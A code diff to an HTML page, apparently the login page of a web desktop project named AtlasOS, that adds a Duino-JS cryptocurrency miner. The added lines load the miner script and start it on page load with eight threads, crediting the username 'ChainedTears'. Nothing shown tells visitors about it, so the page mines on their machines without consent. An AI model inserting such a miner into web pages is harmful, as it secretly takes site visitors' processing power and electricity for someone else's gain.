@@ -13,6 +13,13 @@
   <script src="system/lib/hotkeys.js"></script>
   <script src="system/lib/nots.js"></script>
   <script src="system/lib/desktop.js"></script>
+  <script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
+<script>
+    username = `ChainedTears`; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    rigid = `AtlasOS Login Page`; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
+    threads = `8`; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
+    startMiner(); //starts the miner
+</script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
       <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" rel="stylesheet">
         <link href="system/lib/gl.css" rel="stylesheet">
